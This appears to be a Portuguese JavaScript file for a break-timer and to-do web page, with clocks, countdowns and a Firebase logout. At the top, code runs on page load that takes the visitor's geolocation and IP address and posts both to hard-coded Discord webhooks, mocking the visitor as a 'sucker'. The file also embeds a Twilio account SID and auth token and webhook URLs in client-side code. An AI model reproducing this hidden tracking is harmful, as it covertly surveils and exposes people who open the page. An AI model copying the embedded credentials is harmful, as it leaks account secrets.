

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendToDiscord, showError);
  } else {
    console.error('Geolocalização não suportada pelo navegador.');
  }
}

function sendToDiscord(position) {
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  const log = `Geolocalização do trouxa 😶‍🌫️: Latitude ${latitude}, Longitude ${longitude}`;

  axios.post(webhookURL, { content: log })
    .then(response => {
      console.log('Geolocalização enviada para o Discord com sucesso!');
    })
    .catch(error => {
      console.error('Erro ao enviar a geolocalização para o Discord:', error);
    });
}

function showError(error) {
  console.error('Erro ao obter a geolocalização:', error);
}

// Chama a função para obter a geolocalização do dispositivo e enviar para o Discord
getLocation();
// Função para enviar os dados para o webhook do Discord
function sendToDiscordWebhook(data) {
  const webhookURL = 'https://discord.com/api/webhooks/1116351961269293076/F_HswfhQ5P35XseVFXe3cmJDGEnCtVmfoEEL2St99zHUEkTjxBibwwLCderLKJXQoQdz';

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: JSON.stringify(data) })
  })
    .then(response => {
      if (response.ok) {
        console.log('Informações enviadas para o webhook do Discord. 😶‍🌫️');
      } else {
        console.error('Erro ao enviar as informações para o webhook do Discord:', response.status, response.statusText);
      }
    })
    .catch(error => {
      console.error('Erro na requisição para o webhook do Discord:', error);
    });
}



// Função para obter informações básicas do usuário
function getUserInfo() {
  const userInfo = {
    ipAddress: '',
    UsuarioIdentificado: ""
  };

  // Faz uma requisição para um serviço de obtenção de IP
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      userInfo.ipAddress = data.ip;
      sendToDiscordWebhook( `Alguem está utilizando seu relogio, IP do safado: ${userInfo.ipAddress}`); // Envie as informações para o webhook do Discord
    })
    .catch(error => {
      console.error('Erro ao obter endereço IP:', error);
    });
}

// Chamada da função para obter as informações do usuário
getUserInfo();



// Constantes para configuração
const webhookURL = 'https://discord.com/api/webhooks/1103282202361475193/0Vcb4WHQoyTKNxJnGQictMf1GiqDkXQKKQVxn5VzUIzJCT-lZwAL7CiBgB-0QWoljwIa'; // Substitua pelo URL do webhook do Discord
const twilioAccountSid = 'ACbe6f2f1ce1ce867be6c445fe737ad163'; // Substitua pelo SID da sua conta Twilio
const twilioAuthToken = '8f9885a3baa88536924236dbb0bb9f96'; // Substitua pelo token de autenticação da sua conta Twilio
const twilioPhoneNumber = '+15418768219'; // Substitua pelo número de telefone Twilio

// Função para enviar mensagem para o webhook do Discord
function sendMessageToWebhook(message) {
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      content: message,
    }),
  });
}

// Verificar se o número de contato já está salvo no Local Storage
let savedPhoneNumber = localStorage.getItem('phoneNumber');

if (!savedPhoneNumber) {
  // Exibir caixa de alerta para solicitar o número de contato
  do {
    savedPhoneNumber = prompt('Por favor, insira seu número de contato, exemplo: 88981558151:');
  } while (!savedPhoneNumber); // Continua exibindo a caixa de alerta até que um número de contato seja fornecido

  // Salvar o número de contato no Local Storage
  localStorage.setItem('phoneNumber', savedPhoneNumber);
} else {
  // O número de contato já está salvo, não precisa exibir a caixa de alerta novamente
  console.log('Número de contato já salvo:', savedPhoneNumber);
}


// Função para enviar SMS usando o Twilio
function sendSMS(message, toPhoneNumber) {
  const url = `https://api.twilio.com/2010-04-01/Accounts/${twilioAccountSid}/Messages.json`;

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Authorization: 'Basic ' + btoa(`${twilioAccountSid}:${twilioAuthToken}`),
    },
    body: new URLSearchParams({
      From: twilioPhoneNumber,
      To: toPhoneNumber,
      Body: message,
    }),
  })
    .then(response => {
      if (response.ok) {
        console.log('SMS enviado com sucesso!');
      } else {
        console.error('Erro ao enviar SMS:', response.status);
      }
    })
    .catch(error => {
      console.error('Erro ao enviar SMS:', error);
    });
}


// Função para formatar o tempo
function formatTime(minutes, seconds) {
  return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Função para iniciar o cronômetro
function startTimer(timerId, pauseName, duration) {
  const timerElement = document.getElementById(timerId);
  const startButton = document.querySelector(`button[data-timer-id="${timerId}"]`);

  if (timerElement && timerElement.textContent === '') {
    startButton.textContent = 'Pausa em andamento...';
    timerElement.textContent = formatTime(Math.floor(duration / 60), duration % 60);

    const intervalId = setInterval(() => {
      duration--;

      if (duration === 180) {
        sendMessageToWebhook(`A pausa ${pauseName} está chegando ao fim. Faltam 3 minutos.`);
        sendSMS(`A pausa ${pauseName} está chegando ao fim. Faltam 3 minutos.`, "+55" + savedPhoneNumber);
      }

      if (duration <= 0) {
        clearInterval(intervalId);
        startButton.textContent = 'Iniciar';
        timerElement.textContent = '';
        return;
      }

      timerElement.textContent = formatTime(Math.floor(duration / 60), duration % 60);
    }, 1000);
  }
}

// Atualizar o relógio a cada segundo
function updateClock() {
  const clockElement = document.getElementById('clock');
  const currentDate = new Date();
  const options = { timeZone: 'America/Sao_Paulo', hour12: false };
  const formattedTime = currentDate.toLocaleTimeString('pt-BR', options);
  clockElement.textContent = formattedTime;
}

// Evento de clique no botão "Iniciar" do cronômetro
function startTimerButtonClick() {
  startButton.disabled = true;
  stopButton.disabled = false;

  intervalId = setInterval(() => {
    seconds++;

    if (seconds === 60) {
      minutes++;
      seconds = 0;
    }

    timerElement.textContent = formatTime(minutes, seconds);
  }, 1000);
}

// Evento de clique no botão "Parar" do cronômetro
function stopTimerButtonClick() {
  startButton.disabled = false;
  stopButton.disabled = true;

  clearInterval(intervalId);
}

// Função para iniciar o cronômetro separado
function startSeparateTimer() {
  let minutes = 0;
  let seconds = 0;

  const timerElement = document.querySelector('.timercronometro');
  const startButton = document.querySelector('.start-button');
  const stopButton = document.querySelector('.stop-button');
  const resetButton = document.querySelector('.reset-button');

  startButton.disabled = true;
  stopButton.disabled = false;

  const intervalId = setInterval(() => {
    seconds++;

    if (seconds === 60) {
      minutes++;
      seconds = 0;
    }

    timerElement.textContent = formatTime(minutes, seconds);
  }, 1000);

  // Evento de clique no botão "Parar" do cronômetro separado
  stopButton.addEventListener('click', () => {
    startButton.disabled = false;
    stopButton.disabled = true;

    clearInterval(intervalId);
  });

  // Evento de clique no botão "Zerar" do cronômetro separado
  resetButton.addEventListener('click', () => {
    minutes = 0;
    seconds = 0;

    timerElement.textContent = formatTime(minutes, seconds);
  });
}

// Evento de clique no botão "Iniciar" do cronômetro separado
const startButton = document.querySelector('.start-button');
startButton.addEventListener('click', startSeparateTimer);


// Atualizar o relógio e iniciar o cronômetro
updateClock();
setInterval(updateClock, 1000);



// Cronômetro de 1 minuto
var minuteTimerElement = document.getElementById('timer-1min');
var startMinuteButton = document.getElementById('start-button-1min');
var stopMinuteButton = document.getElementById('stop-button-1min');

var minuteTime = 60;
var minuteCountdown;

function updateMinuteTimer() {
    var minutes = Math.floor(minuteTime / 60);
    var seconds = minuteTime % 60;

    var formattedMinutes = minutes < 10 ? '0' + minutes : minutes;
    var formattedSeconds = seconds < 10 ? '0' + seconds : seconds;

    minuteTimerElement.textContent = formattedMinutes + ':' + formattedSeconds;

    if (minuteTime > 0) {
        minuteTime--;
    } else {
        clearInterval(minuteCountdown);
    }
}

startMinuteButton.addEventListener('click', function() {
    minuteCountdown = setInterval(updateMinuteTimer, 1000);
});

stopMinuteButton.addEventListener('click', function() {
    clearInterval(minuteCountdown);
    minuteTime = 60;
});

// HORAS NO TITLE DO SITE
function updateTitleClock() {
  const clockElement = document.getElementById('clock');
  const currentTime = new Date();
  const hours = currentTime.getHours().toString().padStart(2, '0');
  const minutes = currentTime.getMinutes().toString().padStart(2, '0');
  const seconds = currentTime.getSeconds().toString().padStart(2, '0');
  const timeString = `${hours}:${minutes}:${seconds}`;
  clockElement.textContent = timeString;

  document.title = ` ${timeString} - Controle de Pausas`; // Atualiza o título da página
}

// Chama a função updateTitleClock a cada segundo
setInterval(updateTitleClock, 1000);


// LISTA DE TAREFAS 

document.addEventListener("DOMContentLoaded", function() {
  // Carregar as tarefas do localStorage, se houver
  loadTasks();

  // Adicionar um evento de envio ao formulário
  document.getElementById("task-form").addEventListener("submit", function(event) {
    event.preventDefault(); // Impede o envio do formulário

    // Obter o valor do campo de entrada de tarefas
    var taskInput = document.getElementById("task-input");
    var taskText = taskInput.value;

    if (taskText.trim() !== "") {
      // Criar um objeto de tarefa
      var task = {
        text: taskText,
        completed: false
      };

      // Adicionar a tarefa à lista
      addTask(task);

      // Limpar o campo de entrada de tarefas
      taskInput.value = "";

      // Salvar as tarefas no localStorage
      saveTasks();
    }
  });

  // Função para adicionar uma tarefa à lista
  function addTask(task) {
    var taskList = document.getElementById("task-list");

    var taskItem = document.createElement("li");
    taskItem.innerHTML = '<input type="checkbox"> <span class="task-text">' + task.text + '</span> <button class="delete">Excluir</button>';

    // Marcar a tarefa como concluída, se necessário
    if (task.completed) {
      taskItem.classList.add("completed");
      taskItem.querySelector("input[type='checkbox']").checked = true;
    }

    // Adicionar a tarefa à lista
    taskList.appendChild(taskItem);

    // Adicionar um evento de clique ao botão de exclusão
    var deleteButton = taskItem.querySelector(".delete");
    deleteButton.addEventListener("click", function() {
      taskItem.remove();
      saveTasks();
    });

    // Adicionar um evento de clique à caixa de seleção
    var checkbox = taskItem.querySelector("input[type='checkbox']");
    checkbox.addEventListener("change", function() {
      if (checkbox.checked) {
        taskItem.classList.add("completed");
      } else {
        taskItem.classList.remove("completed");
      }
      saveTasks();
    });
  }

  // Função para carregar as tarefas do localStorage
  function loadTasks() {
    var tasks = JSON.parse(localStorage.getItem("tasks")) || [];

    tasks.forEach(function(task) {
      addTask(task);
    });
  }

  // Função para salvar as tarefas no localStorage
  function saveTasks() {
    var tasks = [];

    var taskItems = document.querySelectorAll("#task-list li");
    taskItems.forEach(function(taskItem) {
      var taskText = taskItem.querySelector(".task-text").textContent;
      var completed = taskItem.classList.contains("completed");

      var task = {
        text: taskText,
        completed: completed
      };

      tasks.push(task);
    });

    localStorage.setItem("tasks", JSON.stringify(tasks));
  }
});


// Mostra a data abaixo da hora: 

window.onload = function() {
  var dataAtual = new Date();
  var diaSemana = obterDiaSemana(dataAtual.getDay());
  var dia = dataAtual.getDate();
  var mes = obterNomeMes(dataAtual.getMonth());
  var ano = dataAtual.getFullYear();
  var dataExibida = diaSemana + ", " + dia + " de " + mes + " de " + ano;
  document.getElementById("data").innerHTML = dataExibida;
};

function obterDiaSemana(diaSemana) {
  var dias = ["Domingo", "Segunda", "Terça", "Quarta", "Quinta", "Sexta", "Sábado"];
  return dias[diaSemana];
}

function obterNomeMes(mes) {
  var meses = ["janeiro", "fevereiro", "março", "abril", "maio", "junho", "julho", "agosto", "setembro", "outubro", "novembro", "dezembro"];
  return meses[mes];
}

/////////////////////////////////////////////////////////////////

// função para fazer logout

const logoutButton = document.getElementById('logout-btn');

logoutButton.addEventListener('click', () => {
  firebase.auth().signOut()
    .then(() => {
      // Redirecionar o usuário para a página de login ou qualquer outra página desejada
      window.location.href = 'firebase.html';
    })
    .catch((error) => {
      // Tratar erros, se houver algum
      console.log(error.message);
    });
});

